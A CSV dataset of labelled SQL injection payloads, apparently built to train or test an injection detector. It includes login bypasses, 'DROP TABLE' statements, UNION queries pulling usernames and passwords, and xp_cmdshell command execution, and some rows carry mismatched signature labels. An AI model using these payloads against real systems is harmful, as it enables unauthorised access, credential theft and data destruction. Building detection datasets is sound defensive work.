Payload,Signature,AttackType,Severity,MITRE,Label,Description
0 or 1=1,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),SQLInjection_Generic,SQL Injection,Critical,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
0x77616974666F722064656C61792027303A303A31302700 exec(@s),SQLInjection_Generic,SQL Injection,Critical,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 or 1=1,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1;SELECT%20*,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 waitfor delay '0:0:10'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'%20or%20''=',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'%20or%201=1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
')%20or%20('x'='x,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'%20or%20'x'='x,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
%20or%20x=x,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
%20'sleep%2050',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
%20$(sleep%2050),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR 1=1 LIMIT 1--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
23 OR 1=1,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR 1=1 LIMIT 1--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
%27%20or%201=1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
admin'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' UNION SELECT @@version--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
%2A%28%7C%28mail%3D%2A%29%29,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
%2A%28%7C%28objectclass%3D%2A%29%29,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
%2A%7C,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' OR 1=1#,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'||'6,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
(||6),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; DROP TABLE users--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; DROP TABLE users--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
admin' or ',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' and 1 in (select var from temp)--,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
anything' OR 'x'='x,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""a"""" or 1=1--""",SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
a' or 1=1--,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""a"""" or 3=3--""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
a' or 3=3--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
a' or 'a' = 'a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
&apos;%20OR,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' AND 1=1--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"' UNION SELECT username,password FROM users--",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
a' waitfor delay '0:0:10'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > ,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
bfilename,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
char%4039%41%2b%40SELECT,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),SQLInjection_Generic,SQL Injection,Critical,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),SQLi_Keyword,SQL Injection,Critical,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
declare @q nvarchar (4000) select @q =,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),SQLi_Keyword,SQL Injection,Critical,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) ,SQLi_Keyword,SQL Injection,Critical,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
declare @s varchar(22) select @s =,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
delete,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
desc,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
distinct,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; exec master..xp_cmdshell,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,SQLInjection_Generic,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
exec(@s),SQLInjection_Generic,SQL Injection,Critical,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; exec ('sel' + 'ect us' + 'er'),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
exec sp,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; execute immediate 'sel' || 'ect us' || 'er',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
exec xp,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; exec xp_regread,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' group by userid having 1=1--,CMDi_Unix,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
handler,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
having,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' having 1=1--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"hi or 1=1 --""",SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
hi' or 1=1 --,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
"""hi"""") or (""""a""""=""""a""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
hi or a=a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
hi' or 'a'='a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
hi') or ('a'='a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'hi' or 'x'='x';,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
insert,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
like,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
limit,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
*(|(mail=*)),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
*(|(objectclass=*)),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1' ORDER BY 1--+,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or ''=',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
" or 0=0 #""",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 0=0 --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 0=0 #,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" or 0=0 --",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or 0=0 --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or 0=0 #,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 1 --',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 1/*,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
; or '1'='1',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or '1'='1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or '1'='1'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 1=1,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 1=1 /*,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 1=1--,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 1=1-- ,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'/**/or/**/1/**/=/**/1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
‘ or 1=1 --,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" or 1=1--",SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or 1=1,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or 1=1--,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
" or 1=1 or """"=",SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 1=1 or ''=',SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 1 in (select @@version)--,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or%201=1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
or%201=1 --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 2 > 1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 2 between 1 and 3,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 3=3,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
‘ or 3=3 --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or '7659'='7659,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or a=a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or a = a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 'a'='a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or a=a--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
') or ('a'='a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" or ""a""=""a",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
) or (a=a,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
order by,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or (EXISTS),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
 or isNULL(1/0) /*,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
""" or isNULL(1/0) /*",SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 'something' like 'some%',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 'something' = 'some'+'thing',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 'text' = n'text',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 'text' > 't',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or uid like '%,CMDi_Unix,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or uname like '%,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 'unusual' = 'unusual',SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or userid like '%,CMDi_Unix,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or user like '%,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or username like '%,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or username like char(37);,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' or 'whatever' in ('whatever'),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' -- &password=,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
password:*/=1--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
PRINT,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
PRINT @@variable,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
procedure,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
replace,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
select,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' select * from information_schema.tables--,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' (select top 1,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
--sp_password,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'sqlattempt1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
(sqlattempt2),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'sqlvuln,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'+sqlvuln,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
(sqlvuln),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
sqlvuln;,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
t'exec master..xp_cmdshell 'nslookup www.google.com'--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
to_timestamp_tz,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
truncate,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
tz_offset,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' UNION ALL SELECT,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' union all select @@version--,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' union select ,SQLi_Keyword,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
uni/**/on sel/**/ect,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
' UNION SELECT,SQLi_Keyword,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
) union select * from information_schema.tables;,SQLi_Keyword,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
update,SQLi_Keyword,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'||UTL_HTTP.REQUEST,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
@variable,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
@var select @var as var into temp end --,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
\x27UNION SELECT,SQLi_Keyword,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
x' AND 1=(SELECT COUNT(*) FROM tabname); --,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
x' AND email IS NULL; --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
x' AND members.email IS NULL; --,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
x' AND userid IS NULL; --,CMDi_Unix,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
x' or 1=1 or 'x'='y,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
x' OR full_name LIKE '%Bob%,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
ý or 1=1 --,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
'; DROP TABLE users--,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 exec sp_ (or exec xp_),SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 and 1=1,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1' and 1=(select count(*) from tablenames); --,SQLi_Keyword,SQL Injection,Medium,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1 or 1=1,SQLInjection_Generic,SQL Injection,High,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1' or '1'='1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1or1=1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
1'or'1'='1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
fake@ema'or'il.nl'='il.nl,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
)%20or%20('x'='x,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
%20or%201=1,SQLInjection_Generic,SQL Injection,Low,T1059.008,Malicious,SQL Injection payload from payloadbox/sql-injection-payload-list repository (master branch)
